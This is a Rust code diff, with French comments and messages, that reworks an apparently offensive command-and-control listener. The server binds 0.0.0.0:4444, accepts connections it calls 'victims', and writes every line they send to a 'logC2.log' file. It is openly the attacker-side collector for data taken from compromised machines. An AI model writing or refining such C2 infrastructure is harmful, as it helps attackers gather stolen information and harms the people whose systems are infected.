@@ -1,47 +1,52 @@
 use std::fs::OpenOptions;
-use std::io::{BufWriter, Write, Read}; // ✅ ajout de Read pour stream.read
+use std::io::{BufRead, BufReader, Write};
 use std::net::TcpListener;
 
 pub fn start_server() {
-    let listener = TcpListener::bind("0.0.0.0:4444")
-        .expect("❌ Impossible d’écouter sur le port 4444");
+    let listener = TcpListener::bind("0.0.0.0:4444").expect("❌ Port 4444 impossible");
 
     println!("[*] En attente de connexions entrantes...");
 
     for stream in listener.incoming() {
         match stream {
-            Ok(mut stream) => {
+            Ok(stream) => {
                 println!("[+] Connexion établie avec {:?}", stream.peer_addr());
 
-                let file = OpenOptions::new()
+                // ✅ FORCE chemin relatif SIMPLE
+                let log_path = "src/Logs/logC2.log";
+
+                std::fs::create_dir_all("src/Logs").expect("❌ Impossible de créer dossier Logs");
+
+                let mut file = OpenOptions::new()
                     .create(true)
                     .append(true)
-                    .open("src/Logs/log.log")
-                    .expect("❌ Impossible d'ouvrir log.log");
+                    .open(&log_path)
+                    .expect("❌ Impossible d'ouvrir logC2.log");
 
-                let mut writer = BufWriter::new(file);
-                let mut buffer = [0u8; 1024];
+                let reader = BufReader::new(stream);
 
-                loop {
-                    match stream.read(&mut buffer) {
-                        Ok(0) => {
-                            println!("[-] Victime déconnectée.");
-                            break;
-                        }
-                        Ok(n) => {
-                            let data = String::from_utf8_lossy(&buffer[..n]);
-                            print!("{}", data); // Affiche dans le terminal
-                            let _ = writer.write_all(data.as_bytes()); // Écrit dans le fichier
-                            let _ = writer.flush();
+                for line in reader.lines() {
+                    match line {
+                        Ok(data) => {
+                            println!("{}", data);
+
+                            if let Err(e) = writeln!(file, "{}", data) {
+                                eprintln!("Erreur écriture logC2 : {}", e);
+                            }
+                            if let Err(e) = file.flush() {
+                                eprintln!("Erreur flush logC2 : {}", e);
+                            }
                         }
                         Err(e) => {
-                            eprintln!("❌ Erreur réseau : {}", e);
+                            eprintln!("Erreur lecture stream : {}", e);
                             break;
                         }
                     }
                 }
+
+                println!("[-] Victime déconnectée.");
             }
-            Err(e) => eprintln!("❌ Erreur de connexion : {}", e),
+            Err(e) => eprintln!("Erreur connexion : {}", e),
         }
     }
 }
